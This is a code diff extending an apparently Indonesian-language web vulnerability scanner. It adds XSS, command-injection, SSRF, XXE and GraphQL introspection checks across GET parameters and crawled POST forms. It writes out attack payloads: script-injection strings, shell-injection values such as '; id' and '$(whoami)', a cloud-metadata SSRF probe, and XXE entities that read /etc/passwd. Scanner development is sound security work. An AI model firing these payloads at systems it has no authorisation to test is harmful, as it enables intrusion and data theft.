@@ -411,18 +411,67 @@ def scan_sqli(sess, base_url, ctx=None):
 
 def scan_xss(sess, base_url, ctx=None):
     f = []; info("Menguji XSS...")
-    if is_echo_endpoint(sess, base_url):
-        info("  (dilewati: endpoint memantulkan input)")
-        return f
-    payload = "<script>alert(1)</script>"
-    for p in ["q","s","search","query","id","page","name"]:
-        try:
-            r = sess.get(base_url, params={p: payload}, timeout=10)
-            if "<script>" in r.text and "alert(1)" in r.text:
-                critical(f"XSS terdeteksi di parameter '{p}'")
-                f.append(("HIGH","XSS_REFLECTED",f"Parameter '{p}' memantulkan tag script mentah — reflected XSS. Attacker bisa menjalankan JavaScript di browser korban. URL: {r.url}"))
-                break
-        except: pass
+    payloads = [
+        "<script>alert(1)</script>",
+        "<img src=x onerror=alert(1)>",
+        '"><script>alert(1)</script>',
+        "javascript:alert(1)",
+    ]
+    params = ["q","s","search","query","id","page","name","text","term","keyword","msg","message","subject","comment"]
+    
+    # ── Reflected XSS via GET ──
+    for payload in payloads:
+        for p in params:
+            try:
+                r = sess.get(base_url, params={p: payload}, timeout=10)
+                if payload in r.text:
+                    critical(f"XSS terdeteksi di parameter '{p}' (GET)")
+                    f.append(("HIGH","XSS_REFLECTED",f"Parameter '{p}' memantulkan tag script mentah — reflected XSS. Attacker bisa menjalankan JavaScript di browser korban. URL: {r.url}"))
+                    break
+            except: pass
+        else: continue
+        break
+
+    # ── XSS via form POST (dari crawler) ──
+    crawler = ctx.get("crawler") if ctx else None
+    if crawler:
+        forms = crawler.get_forms()
+        for action,method,inputs,page in forms:
+            if method.upper() != "POST": continue
+            text_inputs = [i for i in inputs if i["type"] in ("text","search","textarea","") and i["name"]]
+            if not text_inputs: continue
+            for payload in payloads:
+                data = {i["name"]: payload for i in inputs if i["name"]}
+                try:
+                    r = sess.post(action, data=data, timeout=10)
+                    if payload in r.text:
+                        critical(f"XSS terdeteksi via POST form {action}")
+                        f.append(("HIGH","XSS_POST",f"Form POST di {page} (action: {action}) rentan XSS. Field {text_inputs[0]['name']} memantulkan payload JavaScript. Attacker bisa mengirim link ke korban yang mengeksekusi script di browser mereka."))
+                        break
+                except: pass
+            else: continue
+            break
+        
+        # ── Stored XSS — submit lalu cek halaman lain ──
+        if not any("XSS" in x[0] for x in f):
+            for action,method,inputs,page in forms:
+                if method.upper() != "POST": continue
+                text_inputs = [i for i in inputs if i["type"] in ("text","search","textarea","") and i["name"]]
+                if not text_inputs: continue
+                # Coba payload di field pertama aja
+                payload = "<img src=x onerror=alert(1)>"
+                data = {}
+                for i in inputs:
+                    if i["name"]: data[i["name"]] = payload if i == text_inputs[0] else "test"
+                try:
+                    r = sess.post(action, data=data, timeout=10)
+                    # Cek beberapa halaman setelah submit apakah payload muncul
+                    for pg_url, pg_html in list(crawler.pages.items())[:5]:
+                        if pg_url != page and payload in pg_html:
+                            critical(f"Stored XSS: payload muncul di {pg_url}")
+                            f.append(("HIGH","XSS_STORED",f"Data dari form di {page} disimpan dan ditampilkan mentah di {pg_url}. Attacker bisa menyuntikkan JavaScript yang dijalankan setiap kali pengguna lain membuka halaman tersebut."))
+                            break
+                except: pass
     return f
 
 def open_redirect(sess, base_url, ctx=None):
@@ -462,28 +511,86 @@ def cmd_injection(sess, base_url, ctx=None):
     if is_echo_endpoint(sess, base_url):
         info("  (dilewati: endpoint memantulkan input)")
         return f
-    for path in ["/","/ping","/exec","/cmd","/run"]:
-        for payload,label in [("; id","titik koma + id"),("| id","pipe + id"),("`id`","backtick"),("$(whoami)","subshell")]:
-            try:
-                r = sess.get(join(base_url,path), params={"cmd": payload}, timeout=10)
-                body = r.text
-                if ("uid=" in body or "gid=" in body):
-                    if not any(x in body for x in ["whoami","id"]):
-                        critical(f"Command injection di {path}")
-                        f.append(("HIGH","CMD_INJECTION",f"Command injection via parameter 'cmd' di {path}. Payload: {label}. Attacker bisa menjalankan perintah shell di server."))
-                        break
-            except: pass
+    
+    cmd_params = ["cmd","command","exec","ping","host","domain","ip","target","hostname"]
+    cmd_payloads = [("; id","titik koma + id"),("| id","pipe + id"),("`id`","backtick"),("$(whoami)","subshell")]
+    
+    # ── Cek GET params ──
+    for path in ["/","/ping","/exec","/cmd","/run","/api/exec"]:
+        for payload,label in cmd_payloads:
+            for param in cmd_params:
+                try:
+                    r = sess.get(join(base_url,path), params={param: payload}, timeout=10)
+                    body = r.text
+                    if ("uid=" in body or "gid=" in body) and not any(x in body for x in ["whoami","id","git"]):
+                        critical(f"Command injection di {path} via '{param}' (GET)")
+                        f.append(("HIGH","CMD_INJECTION",f"Command injection di {path} via parameter '{param}' (GET). Payload: {label}. Attacker bisa menjalankan perintah shell di server dengan hak akses web server."))
+                        return f
+                except: pass
+    
+    # ── Cek POST form ──
+    crawler = ctx.get("crawler") if ctx else None
+    if crawler:
+        forms = crawler.get_forms()
+        for action,method,inputs,page in forms:
+            if method.upper() != "POST": continue
+            text_inputs = [i for i in inputs if i["type"] in ("text","search","textarea","") and i["name"]]
+            if not text_inputs: continue
+            for payload,label in cmd_payloads:
+                data = {}
+                for i in inputs:
+                    if i["name"]: data[i["name"]] = payload if i == text_inputs[0] else "test"
+                try:
+                    r = sess.post(action, data=data, timeout=10)
+                    body = r.text
+                    if ("uid=" in body or "gid=" in body) and not any(x in body for x in ["whoami","id","git"]):
+                        critical(f"Command injection via POST form {action} (field: {text_inputs[0]['name']})")
+                        f.append(("HIGH","CMD_INJECTION_POST",f"Form POST di {page} (action: {action}) rentan command injection via field '{text_inputs[0]['name']}' dengan payload {label}. Attacker bisa menjalankan perintah shell di server."))
+                        return f
+                except: pass
     return f
 
 def ssrf_check(sess, base_url, ctx=None):
     f = []; info("Menguji SSRF...")
-    for path in ["/proxy","/fetch","/curl","/api/proxy","/api/fetch"]:
-        try:
-            r = sess.get(join(base_url,path), params={"url":"http://169.254.169.254/"}, timeout=10)
-            if r.status_code in (200,301,302) and len(r.content)>10:
-                warn(f"Kemungkinan SSRF: {path}")
-                f.append(("MEDIUM","SSRF",f"Endpoint {path} menerima parameter 'url' dan merespons. Jika server memproses URL internal (seperti 169.254.169.254 untuk metadata AWS/GCP), attacker bisa mencuri kredensial cloud."))
-        except: pass
+    ssrf_url = "http://169.254.169.254/"
+    ssrf_payloads = ["url","uri","link","href","src","ref","reference","callback","redirect","return","next","path","file","document","image","img","target"]
+    
+    # ── Cek endpoint umum via GET ──
+    for path in ["/proxy","/fetch","/curl","/api/proxy","/api/fetch","/api/url","/fetch-url","/proxy?url="]:
+        for param in ["url","uri","target"]:
+            try:
+                target = join(base_url,path)
+                r = sess.get(target, params={param:ssrf_url}, timeout=10)
+                if r.status_code in (200,301,302) and len(r.content)>10:
+                    warn(f"Kemungkinan SSRF: {path}?{param}=...")
+                    f.append(("MEDIUM","SSRF",f"Endpoint {path} dengan parameter '{param}' menerima URL eksternal dan merespons. Jika server memproses URL internal (seperti 169.254.169.254 untuk metadata AWS/GCP), attacker bisa mencuri kredensial cloud."))
+                    break
+            except: pass
+    
+    # ── SSRF via form POST (crawler) ──
+    crawler = ctx.get("crawler") if ctx else None
+    if crawler:
+        forms = crawler.get_forms()
+        for action,method,inputs,page in forms:
+            if method.upper() != "POST": continue
+            url_fields = [i for i in inputs if i["name"] and any(kw in i["name"].lower() for kw in ssrf_payloads)]
+            if not url_fields: continue
+            url_field = url_fields[0]["name"]
+            data = {}
+            for i in inputs:
+                if i["name"]:
+                    data[i["name"]] = ssrf_url if i["name"] == url_field else "test"
+            try:
+                r = sess.post(action, data=data, timeout=10)
+                # Cek apakah server mem-fetch URL (metadata response muncul)
+                if "169.254.169.254" in r.text or len(r.content) > 1000:
+                    warn(f"Kemungkinan SSRF via form field '{url_field}' di {action}")
+                    f.append(("MEDIUM","SSRF_FORM",f"Form POST di {page} (action: {action}) memiliki field '{url_field}' yang mungkin diproses server sebagai URL. Attacker bisa memanfaatkan ini untuk SSRF — membaca metadata cloud internal atau memindai port jaringan internal."))
+                # Cek apakah ada error connection timeout (indikasi fetch attempt)
+                elif "timed out" in r.text.lower() or "connection refused" in r.text.lower() or "couldn't connect" in r.text.lower():
+                    warn(f"SSRF indikasi: field '{url_field}' di {action} mencoba fetch URL (error timeout)")
+                    f.append(("LOW","SSRF_TIMEOUT",f"Field '{url_field}' di form {action} menyebabkan timeout/connection error saat dikirim URL eksternal — indikasi server mencoba mengakses URL tersebut."))
+            except: pass
     return f
 
 def rate_limit(sess, base_url, ctx=None):
@@ -527,22 +634,55 @@ def scan_ssti(sess, base_url, ctx=None):
 
 def scan_xxe(sess, base_url, ctx=None):
     f = []; info("Menguji XXE (XML External Entity)...")
-    crawler = ctx.get("crawler") if ctx else None
-    if not crawler: return f
-    forms = crawler.get_forms()
-    xxe = ['<?xml version="1.0"?><!DOCTYPE r [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><r>&xxe;</r>']
-    for action,method,inputs,page in forms:
-        types = {i["type"] for i in inputs}
-        if "file" not in types and "xml" not in action.lower(): continue
-        for payload in xxe:
+    
+    # Payload XXE — baca /etc/passwd via entity eksternal
+    xxe_payloads = [
+        '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><r>&xxe;</r>',
+        '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>',
+    ]
+    
+    # ── Kirim langsung ke endpoint umum dengan Content-Type XML ──
+    xxe_paths = ["/api/xml","/xml","/soap","/api/soap","/api/upload","/ws","/api/ws"]
+    for path in xxe_paths:
+        url = join(base_url, path)
+        for payload in xxe_payloads:
             try:
-                r = requests.post(join(base_url,action), data={"xml":payload}, timeout=10)
+                r = requests.post(url, data=payload, headers={"Content-Type": "application/xml"}, timeout=10)
                 body = r.text.lower()
                 if "root:" in body and ":" in body and "/bin/bash" in body:
-                    critical(f"XXE terdeteksi di {action}")
-                    f.append(("HIGH","XXE",f"XXE di {action}: payload XML mengeksekusi entity eksternal dan membaca /etc/passwd. Attacker bisa membaca file server, melakukan SSRF, atau denial of service."))
-                    break
+                    critical(f"XXE terdeteksi di {url}")
+                    f.append(("HIGH","XXE_DIRECT",f"XXE di {url}: payload XML mentah berhasil membaca /etc/passwd. Attacker bisa membaca file server (konfigurasi, kredensial, source code), melakukan SSRF ke jaringan internal, atau denial of service (Billion Laughs)."))
+                    return f
             except: pass
+    
+    # ── XXE via form POST ──
+    crawler = ctx.get("crawler") if ctx else None
+    if crawler:
+        forms = crawler.get_forms()
+        for action,method,inputs,page in forms:
+            if method.upper() != "POST": continue
+            types = {i["type"] for i in inputs}
+            text_inputs = [i for i in inputs if i["name"]]
+            # Cari form yg punya field "xml" atau file upload
+            has_xml_field = any("xml" in i["name"].lower() for i in text_inputs)
+            if not has_xml_field and "file" not in types: continue
+            for payload in xxe_payloads:
+                data = {}
+                for i in inputs:
+                    if i["name"]:
+                        # Inject XXE ke field yang namanya mengandung "xml"
+                        if "xml" in i["name"].lower():
+                            data[i["name"]] = payload
+                        else:
+                            data[i["name"]] = "test"
+                try:
+                    r = requests.post(join(base_url,action), data=data, timeout=10)
+                    body = r.text.lower()
+                    if "root:" in body and ":" in body and "/bin/bash" in body:
+                        critical(f"XXE terdeteksi via form {action}")
+                        f.append(("HIGH","XXE_FORM",f"XXE di form {page} (action: {action}): field XML menerima entity eksternal dan mengeksekusi pembacaan file. Attacker bisa membaca file server sensitif."))
+                        return f
+                except: pass
     return f
 
 def scan_nosqli(sess, base_url, ctx=None):
@@ -563,17 +703,35 @@ def scan_nosqli(sess, base_url, ctx=None):
 
 def scan_graphql(sess, base_url, ctx=None):
     f = []; info("Memeriksa GraphQL...")
-    q = json.dumps({"query": "{__schema{types{name fields{name}}}}"})
-    for path in ["/graphql","/api/graphql","/gql","/graphiql"]:
+    # Introspection query mentah (tanpa double-encode)
+    q_raw = "{__schema{types{name fields{name}}}}"
+    paths = ["/graphql","/api/graphql","/gql","/graphiql","/v1/graphql","/query"]
+    for path in paths:
         url = join(base_url,path)
-        for meth in ["GET","POST"]:
-            try:
-                r = sess.get(url, params={"query":q}, timeout=10) if meth=="GET" else sess.post(url, json={"query":q}, timeout=10)
-                if r.status_code in (200,201) and "__schema" in r.text:
-                    critical(f"GraphQL introspection aktif: {url}")
-                    f.append(("HIGH","GRAPHQL_INTROSPECTION",f"GraphQL endpoint di {url} mengizinkan introspection query. Siapa pun bisa mendapatkan skema lengkap API — termasuk semua tipe, query, mutasi, dan field. Ini membocorkan seluruh permukaan API."))
-                    return f
-            except: pass
+        # GET — param query lgsg
+        try:
+            r = sess.get(url, params={"query": q_raw}, timeout=10)
+            if r.status_code in (200,201):
+                try:
+                    j = r.json()
+                    if isinstance(j.get("data"), dict) and "__schema" in j["data"]:
+                        critical(f"GraphQL introspection aktif (GET): {url}")
+                        f.append(("HIGH","GRAPHQL_INTROSPECTION",f"GraphQL endpoint di {url} mengizinkan introspection query via GET. Siapa pun bisa mendapatkan skema lengkap API — termasuk semua tipe, query, mutasi, dan field. Ini membocorkan seluruh permukaan API."))
+                        return f
+                except: pass
+        except: pass
+        # POST — kirim JSON langsung (jangan pake json.dumps lagi biar requests yg encode)
+        try:
+            r = sess.post(url, json={"query": q_raw}, timeout=10)
+            if r.status_code in (200,201):
+                try:
+                    j = r.json()
+                    if isinstance(j.get("data"), dict) and "__schema" in j["data"]:
+                        critical(f"GraphQL introspection aktif (POST): {url}")
+                        f.append(("HIGH","GRAPHQL_INTROSPECTION",f"GraphQL endpoint di {url} mengizinkan introspection query via POST. Siapa pun bisa mendapatkan skema lengkap API — termasuk semua tipe, query, mutasi, dan field. Ini membocorkan seluruh permukaan API."))
+                        return f
+                except: pass
+        except: pass
     return f
 
 def scan_js(sess, base_url, ctx=None):
